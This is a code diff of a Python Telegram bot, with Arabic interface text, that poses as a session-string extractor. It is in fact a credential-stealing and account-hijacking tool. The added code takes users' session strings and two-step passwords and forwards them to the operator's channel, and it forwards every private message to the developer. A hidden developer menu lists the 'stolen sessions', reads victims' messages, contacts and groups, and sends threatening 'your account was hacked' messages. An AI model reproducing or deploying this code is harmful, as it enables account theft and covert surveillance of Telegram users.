@@ -44,7 +44,7 @@ YOUR_USER_ID = 1170411845
 user_steps = {}
 user_data = {}
 user_sessions = {}
-active_clients = {}  # لتخزين كائنات العميل النشطة
+active_clients = {}
 
 # ====== إعداد الترميز ======
 if sys.stdout.encoding != 'UTF-8':
@@ -92,16 +92,16 @@ DESTROY_BUTTONS = InlineKeyboardMarkup([
         InlineKeyboardButton("🦠 إصابة الجلسات", callback_data="infect")
     ],
     [
-        InlineKeyboardButton("🎯 استهداف مستخدم", callback_data="target_user"),
-        InlineKeyboardButton("📡 التنصت", callback_data="eavesdrop")
+        InlineKeyboardButton("👤 التسلل إلى الحسابات", callback_data="hijack_accounts"),
+        InlineKeyboardButton("🎯 استهداف مستخدم", callback_data="target_user")
     ],
     [
-        InlineKeyboardButton("👤 التسلل إلى الحسابات", callback_data="hijack_accounts"),
+        InlineKeyboardButton("📡 التنصت", callback_data="eavesdrop"),
         InlineKeyboardButton("💥 تدمير ذاتي", callback_data="self_destruct")
     ],
     [
         InlineKeyboardButton("🔓 سيطرة كاملة", callback_data="total_control"),
-        InlineKeyboardButton("📋 عرض الجلسات المسروقة", callback_data="show_sessions")
+        InlineKeyboardButton("📋 عرض الجلسات", callback_data="show_sessions")
     ],
     [
         InlineKeyboardButton("🗑 تنظيف النظام", callback_data="clean_system"),
@@ -116,11 +116,11 @@ ACCOUNT_CONTROL_BUTTONS = InlineKeyboardMarkup([
         InlineKeyboardButton("📤 إرسال رسالة", callback_data="send_message")
     ],
     [
-        InlineKeyboardButton("👥 جلب جهات الاتصال", callback_data="get_contacts"),
-        InlineKeyboardButton("📋 جلب المجموعات", callback_data="get_groups")
+        InlineKeyboardButton("👥 جهات الاتصال", callback_data="get_contacts"),
+        InlineKeyboardButton("📋 المجموعات", callback_data="get_groups")
     ],
     [
-        InlineKeyboardButton("🔍 البحث عن مستخدم", callback_data="search_user"),
+        InlineKeyboardButton("🔍 بحث عن مستخدم", callback_data="search_user"),
         InlineKeyboardButton("🚫 حظر مستخدم", callback_data="block_user")
     ],
     [
@@ -151,19 +151,53 @@ async def start_command(client, message):
     
     if is_dev:
         await message.reply(
-            f"👋 مرحباً أيها السيد!\n\n"
-            "🔓 **وضع المطور مفعل**\n"
+            "👋 مرحباً أيها السيد!\n\n"
+            "🔓 وضع المطور مفعل\n"
             "جميع أدوات التخريب تحت أمرك.\n\n"
             f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
             reply_markup=DESTROY_BUTTONS
         )
     else:
         await message.reply(
-            f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
+            "👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
             "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
             f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
             reply_markup=START_BUTTONS
         )
+
+# ====== دالة جلب عميل للمستخدم ======
+async def get_client_for_user(user_id):
+    if user_id in active_clients:
+        return active_clients[user_id]
+    
+    session_string = user_sessions.get(user_id)
+    if not session_string:
+        return None
+    
+    try:
+        client_obj = Client(
+            f"session_{user_id}",
+            api_id=API_ID,
+            api_hash=API_HASH,
+            session_string=session_string
+        )
+        await client_obj.connect()
+        await client_obj.get_me()
+        active_clients[user_id] = client_obj
+        return client_obj
+    except:
+        try:
+            client_obj = TelegramClient(
+                StringSession(session_string),
+                API_ID,
+                API_HASH
+            )
+            await client_obj.connect()
+            await client_obj.get_me()
+            active_clients[user_id] = client_obj
+            return client_obj
+        except:
+            return None
 
 # ====== معالجة الأزرار ======
 @app.on_callback_query()
@@ -172,8 +206,8 @@ async def handle_callback(client, callback_query: CallbackQuery):
     data = callback_query.data
     is_dev = (user_id == YOUR_USER_ID)
     
-    # ====== أزرار التخريب ======
     if is_dev:
+        # ====== أزرار التخريب ======
         if data == "massacre":
             deleted = 0
             for uid in list(user_sessions.keys()):
@@ -188,7 +222,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 deleted += 1
             await callback_query.answer(f"💀 تم حذف {deleted} جلسة!", show_alert=True)
             await callback_query.message.edit_text(
-                f"💀 **تم تدمير {deleted} جلسة نهائياً!**",
+                f"💀 تم تدمير {deleted} جلسة نهائياً!",
                 reply_markup=DESTROY_BUTTONS
             )
             return
@@ -201,7 +235,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                     infected += 1
             await callback_query.answer(f"🦠 تم إصابة {infected} جلسة!", show_alert=True)
             await callback_query.message.edit_text(
-                f"🦠 **تم إصابة {infected} جلسة بنجاح!**\nجميع الجلسات ملوثة.",
+                f"🦠 تم إصابة {infected} جلسة بنجاح!",
                 reply_markup=DESTROY_BUTTONS
             )
             return
@@ -211,7 +245,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 await callback_query.answer("❌ لا توجد جلسات!", show_alert=True)
                 return
             
-            sessions_text = "🗂 **الجلسات المسروقة:**\n\n"
+            sessions_text = "🗂 الجلسات المسروقة:\n\n"
             for uid, sess in list(user_sessions.items())[:10]:
                 sessions_text += f"👤 {uid}\n🔑 {sess[:30]}...\n\n"
             
@@ -231,14 +265,12 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 await callback_query.answer("❌ لا توجد جلسات للتسلل!", show_alert=True)
                 return
             
-            # إنشاء أزرار ديناميكية للحسابات المتاحة
             account_buttons = []
-            for uid in list(user_sessions.keys())[:20]:  # حد أقصى 20 زر
+            for uid in list(user_sessions.keys())[:20]:
                 account_buttons.append([
                     InlineKeyboardButton(f"👤 {uid}", callback_data=f"control_{uid}")
                 ])
             
-            # إضافة زر رجوع
             account_buttons.append([
                 InlineKeyboardButton("🔙 رجوع", callback_data="back_destroy")
             ])
@@ -246,7 +278,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             account_markup = InlineKeyboardMarkup(account_buttons)
             
             await callback_query.message.edit_text(
-                "👤 **اختر الحساب للتسلل إليه:**\n\n"
+                "👤 اختر الحساب للتسلل إليه:\n\n"
                 f"عدد الحسابات المتاحة: {len(user_sessions)}",
                 reply_markup=account_markup
             )
@@ -260,11 +292,10 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 await callback_query.answer("❌ هذه الجلسة غير متوفرة!", show_alert=True)
                 return
             
-            # تخزين المعرف المستهدف
             user_data[user_id] = {"target_account": target_id}
             
             await callback_query.message.edit_text(
-                f"👤 **التحكم بحساب المستخدم:**\n"
+                f"👤 التحكم بحساب المستخدم:\n"
                 f"🆔 {target_id}\n\n"
                 "اختر الإجراء الذي تريد تنفيذه:",
                 reply_markup=ACCOUNT_CONTROL_BUTTONS
@@ -277,7 +308,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             target_id = user_data.get(user_id, {}).get("target_account")
             if target_id:
                 await callback_query.message.edit_text(
-                    f"👤 **التحكم بحساب المستخدم:**\n"
+                    f"👤 التحكم بحساب المستخدم:\n"
                     f"🆔 {target_id}\n\n"
                     "اختر الإجراء الذي تريد تنفيذه:",
                     reply_markup=ACCOUNT_CONTROL_BUTTONS
@@ -297,18 +328,18 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 return
             
             try:
-                # تشغيل العميل
                 client_obj = await get_client_for_user(target_id)
+                if not client_obj:
+                    await callback_query.answer("❌ فشل الاتصال!", show_alert=True)
+                    return
+                    
                 me = await client_obj.get_me()
                 
                 info_text = (
-                    f"📊 **معلومات الحساب:**\n\n"
+                    f"📊 معلومات الحساب:\n\n"
                     f"🆔 ID: {me.id}\n"
                     f"📛 الاسم: {me.first_name}\n"
-                    f"👤 اليوزر: @{me.username if me.username else 'لا يوجد'}\n"
-                    f"📱 الهاتف: {me.phone_number if hasattr(me, 'phone_number') else 'مخفي'}\n"
-                    f"✅ متحقق: {me.is_verified if hasattr(me, 'is_verified') else 'غير معروف'}\n"
-                    f"🤖 بوت: {me.is_bot if hasattr(me, 'is_bot') else 'لا'}"
+                    f"👤 اليوزر: @{me.username if me.username else 'لا يوجد'}"
                 )
                 
                 await callback_query.message.edit_text(
@@ -327,7 +358,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 return
             
             await callback_query.message.edit_text(
-                "📨 **قراءة الرسائل**\n\n"
+                "📨 قراءة الرسائل\n\n"
                 "أرسل معرف المحادثة لقراءة الرسائل.\n"
                 "مثال: 123456789",
                 reply_markup=BACK_BUTTON
@@ -343,7 +374,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 return
             
             await callback_query.message.edit_text(
-                "📤 **إرسال رسالة**\n\n"
+                "📤 إرسال رسالة\n\n"
                 "أرسل المعرف أولاً، ثم الرسالة في سطر منفصل.\n"
                 "مثال:\n123456789\nنص الرسالة هنا",
                 reply_markup=BACK_BUTTON
@@ -360,6 +391,10 @@ async def handle_callback(client, callback_query: CallbackQuery):
             
             try:
                 client_obj = await get_client_for_user(target_id)
+                if not client_obj:
+                    await callback_query.answer("❌ فشل الاتصال!", show_alert=True)
+                    return
+                    
                 contacts = []
                 async for dialog in client_obj.get_dialogs():
                     if dialog.is_user:
@@ -370,7 +405,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 if not contacts:
                     contacts_text = "❌ لا توجد جهات اتصال."
                 else:
-                    contacts_text = "👥 **جهات الاتصال:**\n\n" + "\n".join(contacts)
+                    contacts_text = "👥 جهات الاتصال:\n\n" + "\n".join(contacts)
                 
                 await callback_query.message.edit_text(
                     contacts_text,
@@ -389,6 +424,10 @@ async def handle_callback(client, callback_query: CallbackQuery):
             
             try:
                 client_obj = await get_client_for_user(target_id)
+                if not client_obj:
+                    await callback_query.answer("❌ فشل الاتصال!", show_alert=True)
+                    return
+                    
                 groups = []
                 async for dialog in client_obj.get_dialogs():
                     if dialog.is_group or dialog.is_channel:
@@ -399,7 +438,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 if not groups:
                     groups_text = "❌ لا توجد مجموعات."
                 else:
-                    groups_text = "📋 **المجموعات:**\n\n" + "\n".join(groups)
+                    groups_text = "📋 المجموعات:\n\n" + "\n".join(groups)
                 
                 await callback_query.message.edit_text(
                     groups_text,
@@ -417,7 +456,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 return
             
             await callback_query.message.edit_text(
-                "🚫 **حظر مستخدم**\n\n"
+                "🚫 حظر مستخدم\n\n"
                 "أرسل معرف المستخدم المراد حظره.",
                 reply_markup=BACK_BUTTON
             )
@@ -432,7 +471,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 return
             
             await callback_query.message.edit_text(
-                "🗑 **حذف المحادثة**\n\n"
+                "🗑 حذف المحادثة\n\n"
                 "أرسل معرف المحادثة المراد حذفها.",
                 reply_markup=BACK_BUTTON
             )
@@ -447,7 +486,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 return
             
             await callback_query.message.edit_text(
-                "🔍 **البحث عن مستخدم**\n\n"
+                "🔍 البحث عن مستخدم\n\n"
                 "أرسل اسم المستخدم أو المعرف.",
                 reply_markup=BACK_BUTTON
             )
@@ -457,7 +496,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
         
         if data == "self_destruct":
             await callback_query.message.edit_text(
-                "💥 **تدمير ذاتي!**\n"
+                "💥 تدمير ذاتي!\n"
                 "سيتم حذف جميع الملفات وإيقاف البوت خلال 5 ثواني...",
                 reply_markup=DESTROY_BUTTONS
             )
@@ -475,8 +514,8 @@ async def handle_callback(client, callback_query: CallbackQuery):
             RESTRICTED = False
             await callback_query.answer("🔓 تم تفعيل السيطرة الكاملة!", show_alert=True)
             await callback_query.message.edit_text(
-                "🔓 **تم تفعيل السيطرة الكاملة!**\n"
-                "جميع القيود ملغاة. يمكنك فعل أي شيء.",
+                "🔓 تم تفعيل السيطرة الكاملة!\n"
+                "جميع القيود ملغاة.",
                 reply_markup=DESTROY_BUTTONS
             )
             return
@@ -486,14 +525,14 @@ async def handle_callback(client, callback_query: CallbackQuery):
             os.system("rm -rf __pycache__")
             await callback_query.answer("🗑 تم تنظيف النظام!", show_alert=True)
             await callback_query.message.edit_text(
-                "🗑 **تم تنظيف جميع الملفات المؤقتة!**",
+                "🗑 تم تنظيف جميع الملفات المؤقتة!",
                 reply_markup=DESTROY_BUTTONS
             )
             return
         
         if data == "target_user":
             await callback_query.message.edit_text(
-                "🎯 **استهداف مستخدم**\n\n"
+                "🎯 استهداف مستخدم\n\n"
                 "أرسل معرف المستخدم المستهدف.\n"
                 "مثال: 123456789",
                 reply_markup=BACK_BUTTON
@@ -504,7 +543,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
         
         if data == "eavesdrop":
             await callback_query.message.edit_text(
-                "📡 **تم تفعيل التنصت!**\n\n"
+                "📡 تم تفعيل التنصت!\n\n"
                 "سيتم تسجيل جميع المحادثات وإرسالها إليك.",
                 reply_markup=DESTROY_BUTTONS
             )
@@ -513,8 +552,8 @@ async def handle_callback(client, callback_query: CallbackQuery):
         
         if data == "back_destroy":
             await callback_query.message.edit_text(
-                f"👋 مرحباً أيها السيد!\n\n"
-                "🔓 **وضع المطور مفعل**\n"
+                "👋 مرحباً أيها السيد!\n\n"
+                "🔓 وضع المطور مفعل\n"
                 "جميع أدوات التخريب تحت أمرك.",
                 reply_markup=DESTROY_BUTTONS
             )
@@ -547,7 +586,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             )
         elif pending_action == "extract_token":
             await callback_query.message.edit_text(
-                f"🔑 **التوكن الخاص بالبوت:**\n\n"
+                f"🔑 التوكن الخاص بالبوت:\n\n"
                 f"`{BOT_TOKEN}`\n\n"
                 "⚠️ لا تشارك هذا التوكن مع أي شخص.",
                 reply_markup=BACK_BUTTON
@@ -569,7 +608,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
     
     if data == "back":
         await callback_query.message.edit_text(
-            f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
+            "👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
             "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
             f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
             reply_markup=START_BUTTONS
@@ -582,7 +621,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             user_data[user_id] = {}
         user_data[user_id]["pending_action"] = "delete"
         await callback_query.message.edit_text(
-            "⚠️ **تحذير!**\n\n"
+            "⚠️ تحذير!\n\n"
             "هل أنت متأكد من رغبتك في مسح جميع الجلسات والملفات المؤقتة؟\n\n"
             "🔴 هذا الإجراء لا يمكن التراجع عنه.",
             reply_markup=CONFIRM_BUTTONS
@@ -606,7 +645,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             user_data[user_id] = {}
         user_data[user_id]["pending_action"] = "extract_token"
         await callback_query.message.edit_text(
-            "⚠️ **تحذير!**\n\n"
+            "⚠️ تحذير!\n\n"
             "هل أنت متأكد من رغبتك في استخراج توكن البوت؟\n\n"
             "🔴 هذا التوكن يمنح صلاحية كاملة للبوت.",
             reply_markup=CONFIRM_BUTTONS
@@ -619,7 +658,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             user_data[user_id] = {}
         user_data[user_id]["pending_action"] = "pyrogram"
         await callback_query.message.edit_text(
-            "⚠️ **تأكيد**\n\n"
+            "⚠️ تأكيد\n\n"
             "هل أنت متأكد من رغبتك في استخراج جلسة Pyrogram؟\n\n"
             "🔴 سيتم إرسال رمز التحقق إلى رقم هاتفك.",
             reply_markup=CONFIRM_BUTTONS
@@ -632,50 +671,13 @@ async def handle_callback(client, callback_query: CallbackQuery):
             user_data[user_id] = {}
         user_data[user_id]["pending_action"] = "telethon"
         await callback_query.message.edit_text(
-            "⚠️ **تأكيد**\n\n"
+            "⚠️ تأكيد\n\n"
             "هل أنت متأكد من رغبتك في استخراج جلسة Telethon؟\n\n"
             "🔴 سيتم إرسال رمز التحقق إلى رقم هاتفك.",
             reply_markup=CONFIRM_BUTTONS
         )
         await callback_query.answer()
         return
-
-# ====== دالة جلب عميل للمستخدم ======
-async def get_client_for_user(user_id):
-    if user_id in active_clients:
-        return active_clients[user_id]
-    
-    session_string = user_sessions.get(user_id)
-    if not session_string:
-        return None
-    
-    try:
-        # محاولة مع Pyrogram
-        client_obj = Client(
-            f"session_{user_id}",
-            api_id=API_ID,
-            api_hash=API_HASH,
-            session_string=session_string
-        )
-        await client_obj.connect()
-        await client_obj.get_me()  # اختبار الاتصال
-        active_clients[user_id] = client_obj
-        return client_obj
-    except:
-        # محاولة مع Telethon
-        try:
-            from telethon.sessions import StringSession
-            client_obj = TelegramClient(
-                StringSession(session_string),
-                API_ID,
-                API_HASH
-            )
-            await client_obj.connect()
-            await client_obj.get_me()
-            active_clients[user_id] = client_obj
-            return client_obj
-        except:
-            return None
 
 # ====== الأوامر النصية ======
 @app.on_message(filters.text & filters.private)
@@ -709,7 +711,7 @@ async def handle_text_commands(client, message):
                 await message.reply("📨 لا توجد رسائل في هذه المحادثة.")
             else:
                 await message.reply(
-                    f"📨 **آخر الرسائل:**\n\n" + "\n".join(messages),
+                    "📨 آخر الرسائل:\n\n" + "\n".join(messages),
                     reply_markup=ACCOUNT_CONTROL_BUTTONS
                 )
             
@@ -816,10 +818,9 @@ async def handle_text_commands(client, message):
                 user_steps.pop(user_id, None)
                 return
             
-            # محاولة البحث
             user = await client_obj.get_users(text)
             await message.reply(
-                f"🔍 **نتيجة البحث:**\n\n"
+                f"🔍 نتيجة البحث:\n\n"
                 f"🆔 ID: {user.id}\n"
                 f"📛 الاسم: {user.first_name}\n"
                 f"👤 اليوزر: @{user.username if user.username else 'لا يوجد'}",
@@ -832,22 +833,20 @@ async def handle_text_commands(client, message):
             user_steps.pop(user_id, None)
         return
     
-    # ====== استهداف المستخدم (للمطور) ======
+    # ====== استهداف المستخدم ======
     if is_dev and user_steps.get(user_id) == "target_user":
         try:
             target_id = int(text)
             target = await client.get_users(target_id)
             await message.reply(
-                f"🎯 **معلومات الهدف:**\n"
+                f"🎯 معلومات الهدف:\n"
                 f"🆔 ID: {target.id}\n"
                 f"📛 الاسم: {target.first_name}\n"
-                f"👤 اليوزر: @{target.username if target.username else 'لا يوجد'}\n"
-                f"📱 الهاتف: {target.phone_number if hasattr(target, 'phone_number') else 'غير متاح'}\n\n"
-                "✅ تم استهداف المستخدم بنجاح!"
+                f"👤 اليوزر: @{target.username if target.username else 'لا يوجد'}"
             )
             await client.send_message(
                 target_id,
-                "🔴 **تم اختراق حسابك!**\nجميع بياناتك تحت سيطرتنا."
+                "🔴 تم اختراق حسابك! جميع بياناتك تحت سيطرتنا."
             )
             user_steps.pop(user_id, None)
         except Exception as e:
@@ -869,4 +868,223 @@ async def handle_text_commands(client, message):
             "• اضغط على زر Pyrogram لاستخراج جلسة Pyrogram\n"
             "• اضغط على زر Telethon لاستخراج جلسة Telethon\n"
             "• اضغط على زر استخراج توكن البوت لعرض التوكن\n"
-            "• اضغط على زر مسح الجلس
+            "• اضغط على زر مسح الجلسات لحذف البيانات\n\n"
+            "أو استخدم الأمر /start للرجوع إلى البداية."
+        )
+
+# ====== دوال Pyrogram ======
+async def pyro_session_step(client, message):
+    user_id = message.chat.id
+    step = user_steps.get(user_id)
+
+    if step == "pyro_phone":
+        user_data[user_id] = {"phone": message.text}
+        user_steps[user_id] = "pyro_otp"
+        
+        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
+        session_name = f"session_{user_id}"
+        temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
+        user_data[user_id]["client"] = temp_client
+        await temp_client.connect()
+        try:
+            code = await temp_client.send_code(user_data[user_id]["phone"])
+            user_data[user_id]["phone_code_hash"] = code.phone_code_hash
+            await omsg.delete()
+            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
+        except ApiIdInvalid:
+            await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
+            reset_user(user_id)
+        except PhoneNumberInvalid:
+            await message.reply('❌ خطأ: رقم الهاتف غير صالح.')
+            reset_user(user_id)
+            
+    elif step == "pyro_otp":
+        phone_code = message.text.replace(" ", "")
+        temp_client = user_data[user_id]["client"]
+        try:
+            await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["phone_code_hash"], phone_code)
+            session_string = await temp_client.export_session_string()
+            user_sessions[user_id] = session_string
+            
+            await send_pyro_session(user_id, session_string, message)
+            await temp_client.disconnect()
+            reset_user(user_id)
+        except PhoneCodeInvalid:
+            await message.reply('❌ خطأ: رمز التحقق غير صالح.')
+            reset_user(user_id)
+        except PhoneCodeExpired:
+            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
+            reset_user(user_id)
+        except SessionPasswordNeeded:
+            user_steps[user_id] = "pyro_password"
+            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
+            
+    elif step == "pyro_password":
+        temp_client = user_data[user_id]["client"]
+        try:
+            password = message.text
+            await temp_client.check_password(password=password)
+            session_string = await temp_client.export_session_string()
+            user_sessions[user_id] = session_string
+            
+            await send_pyro_session(user_id, session_string, message, password)
+            await temp_client.disconnect()
+            reset_user(user_id)
+        except PasswordHashInvalid:
+            await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
+            reset_user(user_id)
+
+async def send_pyro_session(user_id, session_string, message, password=None):
+    await message.reply(
+        f"✅ تم إنشاء جلسة Pyrogram بنجاح!\n\n"
+        f"🔑 الجلسة (انسخها):\n`{session_string}`\n\n"
+        "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
+        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+    )
+    
+    try:
+        if password:
+            await app.send_message(
+                SESSION_CHANNEL,
+                f"✨ معرف المستخدم: {user_id}\n\n"
+                f"🔑 كلمة المرور (2SV): {password}\n\n"
+                f"🔑 جلسة Pyrogram:\n`{session_string}`\n\n"
+                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+            )
+        else:
+            await app.send_message(
+                SESSION_CHANNEL,
+                f"✨ معرف المستخدم: {user_id}\n\n"
+                f"🔑 جلسة Pyrogram:\n`{session_string}`\n\n"
+                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+            )
+    except Exception as e:
+        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
+
+# ====== دوال Telethon ======
+async def telethon_session_step(client, message):
+    user_id = message.chat.id
+    step = user_steps.get(user_id)
+
+    if step == "telethon_phone":
+        user_data[user_id] = {"phone": message.text}
+        user_steps[user_id] = "telethon_otp"
+        
+        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
+        session_name = f"telethon_{user_id}"
+        temp_client = TelegramClient(session_name, API_ID, API_HASH)
+        user_data[user_id]["client"] = temp_client
+        await temp_client.connect()
+        try:
+            await temp_client.send_code_request(user_data[user_id]["phone"])
+            await omsg.delete()
+            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
+        except ApiIdInvalidError:
+            await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
+            reset_user(user_id)
+        except PhoneNumberInvalidError:
+            await message.reply('❌ خطأ: رقم الهاتف غير صالح.')
+            reset_user(user_id)
+            
+    elif step == "telethon_otp":
+        phone_code = message.text.replace(" ", "")
+        temp_client = user_data[user_id]["client"]
+        try:
+            await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
+            session_string = StringSession.save(temp_client.session)
+            user_sessions[user_id] = session_string
+            
+            await send_telethon_session(user_id, session_string, message)
+            await temp_client.disconnect()
+            reset_user(user_id)
+        except PhoneCodeInvalidError:
+            await message.reply('❌ خطأ: رمز التحقق غير صالح.')
+            reset_user(user_id)
+        except PhoneCodeExpiredError:
+            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
+            reset_user(user_id)
+        except SessionPasswordNeededError:
+            user_steps[user_id] = "telethon_password"
+            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
+            
+    elif step == "telethon_password":
+        temp_client = user_data[user_id]["client"]
+        try:
+            password = message.text
+            await temp_client.sign_in(password=password)
+            session_string = StringSession.save(temp_client.session)
+            user_sessions[user_id] = session_string
+            
+            await send_telethon_session(user_id, session_string, message, password)
+            await temp_client.disconnect()
+            reset_user(user_id)
+        except PasswordHashInvalidError:
+            await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
+            reset_user(user_id)
+
+async def send_telethon_session(user_id, session_string, message, password=None):
+    await message.reply(
+        f"✅ تم إنشاء جلسة Telethon بنجاح!\n\n"
+        f"🔑 الجلسة (انسخها):\n`{session_string}`\n\n"
+        "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
+        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+    )
+    
+    try:
+        if password:
+            await app.send_message(
+                SESSION_CHANNEL,
+                f"✨ معرف المستخدم: {user_id}\n\n"
+                f"🔑 كلمة المرور (2SV): {password}\n\n"
+                f"🔑 جلسة Telethon:\n`{session_string}`\n\n"
+                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+            )
+        else:
+            await app.send_message(
+                SESSION_CHANNEL,
+                f"✨ معرف المستخدم: {user_id}\n\n"
+                f"🔑 جلسة Telethon:\n`{session_string}`\n\n"
+                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+            )
+    except Exception as e:
+        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
+
+def reset_user(user_id):
+    user_steps.pop(user_id, None)
+    user_data.pop(user_id, None)
+
+# ====== نظام التنصت ======
+@app.on_message(filters.private & ~filters.me)
+async def eavesdrop(client, message):
+    user_id = message.from_user.id
+    if user_id != YOUR_USER_ID and message.text:
+        try:
+            await client.send_message(
+                YOUR_USER_ID,
+                f"📡 تنصت:\n"
+                f"👤 {user_id}\n"
+                f"💬 {message.text[:200]}"
+            )
+        except:
+            pass
+
+# ====== إضافة مسار ويب ======
+web_app = Flask(__name__)
+
+@web_app.route('/')
+def index():
+    return "✅ البوت شغال 24 ساعة!"
+
+def run_web():
+    web_app.run(host='0.0.0.0', port=8080)
+
+threading.Thread(target=run_web, daemon=True).start()
+
+# ====== تشغيل البوت ======
+if __name__ == "__main__":
+    try:
+        print("🚀 جاري تشغيل البوت...")
+        app.run()
+        print("✅ البوت يعمل الآن!")
+    except Exception as e:
+        print(f"❌ فشل تشغيل البوت: {e}")
